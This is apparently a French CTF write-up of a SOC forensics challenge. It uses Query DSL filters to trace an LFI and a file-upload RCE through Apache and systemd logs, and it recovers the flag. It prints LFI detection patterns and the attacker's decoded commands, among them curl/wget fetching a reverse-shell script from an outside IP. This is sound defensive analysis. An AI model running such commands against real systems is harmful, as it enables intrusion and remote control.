---
title: DGSE CTF - Mission 2 (SOC)
date: 2025-04-27 14:15:00 +0800
categories: [DGSE CTF]
tags: [dgse, rootme, soc]
image:
  path: /assets/img/20250427/mission-02-statement.png
  alt: Brief de la mission 2.
---
Nous disposons de deux fichiers de logs : un provenant d’`Apache` et un autre de `systemd`. Commençons par analyser celui d’`Apache`.

Le fichier contient environ 32 000 lignes de logs. Dans un premier temps, j’ai trié les entrées par date, dans l’ordre croissant. J’ai ensuite appliqué un filtre en Query DSL afin d’identifier d’éventuelles requêtes malveillantes correspondantes à une tentative de **Local File Inclusion (LFI)** :
```json
{
  "query": {
    "bool": {
      "should": [
        {
          "wildcard": {
            "request": "*../*"
          }
        },
        {
          "wildcard": {
            "request": "*..%2f*"
          }
        },
        {
          "wildcard": {
            "request": "*php://*"
          }
        },
        {
          "wildcard": {
            "request": "*file://*"
          }
        },
        {
          "wildcard": {
            "request": "*/etc/passwd*"
          }
        },
        {
          "wildcard": {
            "request": "*input*"
          }
        },
        {
          "wildcard": {
            "request": "*expect*"
          }
        },
        {
          "wildcard": {
            "request": "*filter*"
          }
        }
      ],
      "minimum_should_match": 1
    }
  }
} 
```
Ce filtrage met effectivement en évidence plusieurs tentatives d’exploitation **LFI**, toutes semblant provenir de l’adresse IP **10.143.17.101**, aux alentours de **00h23** le **28/03/2025** :

![Desktop View](/assets/img/20250427/mission-02-LFI.png){: width="572" height="400" }
_Tentatives de LFI_

J’ai ensuite affiné la recherche en ciblant spécifiquement cette IP, sur la plage horaire allant de 00h20 à 00h40, tout en conservant uniquement les requêtes ayant reçu une réponse HTTP 200 :
```json
{
  "query": {
    "bool": {
      "must": [
        {
          "term": {
            "clientip": "10.143.17.101"
          }
        },
        {
          "range": {
            "@timestamp": {
              "gte": "2025-03-28T00:20:00.000+01:00",
              "lte": "2025-03-28T00:40:00.000+01:00"
            }
          }
        },
        {
          "term": {
            "response": 200
          }
        }
      ]
    }
  }
}
```  
Ce filtrage retourne 33 résultats. On observe qu’autour de 00h29, l’attaquant a uploadé un fichier, qu’il utilise ensuite pour exécuter des commandes à distance via le paramètre **cmd** dans l’URL.
Il s’agit donc très probablement d’une seconde vulnérabilité : un upload de fichier non sécurisé menant à une **Remote Code Execution (RCE)**.

![Desktop View](/assets/img/20250427/mission-02-upload-rce.png){: width="572" height="400" }
_file upload et RCE_

Voici les commandes récupérées après décodage des chaînes Base64 :
- `ping -c 1 google.com`
- `curl http://163.172.67.201:49999/`
- `wget http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh`
- `chmod +x s1mpl3-r3vsh3ll-vps.sh`

L’attaquant semble donc récupérer son reverse shell depuis l’adresse **163.172.67.201:49999**.

Il ne reste plus qu’à identifier le chemin du fichier utilisé pour maintenir la persistance.
Pour cela, j’ai examiné les événements associés à sh dans le fichier de logs systemd, en filtrant les exécutions à partir de **00h29** :
```json
{
  "query": {
    "bool": {
      "must": [
        {
          "range": {
            "@timestamp": {
              "gte": "2025-03-28T00:29:00.000+01:00"
            }
          }
        },
        {
          "match_phrase": {
            "cmdline": ".sh"
          }
        }
      ]
    }
  }
} 
```

![Desktop View](/assets/img/20250427/mission-02-persistence.png){: width="572" height="400" }
_Fichier de persistance_

On observe alors l’exécution du script **/root/.0x00/pwn3d-by-nullv4stati0n.sh**, très certainement utilisé pour maintenir la persistance de l’accès. 

Pour récaptituler : 
- CWE de la première vulnérabilité : `Local File Inclusion -> CWE-98` ;  
- CWE de la seconde vulnérabilité : `File upload (qui mène à une RCE) -> CWE-434` ;  
- IP du serveur de l'attaquant : `163.172.67.201` ;  
- Chemin du fichier de persistance : `/root/.0x00/pwn3d-by-nullv4stati0n.sh` ;

Flag : `RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}`
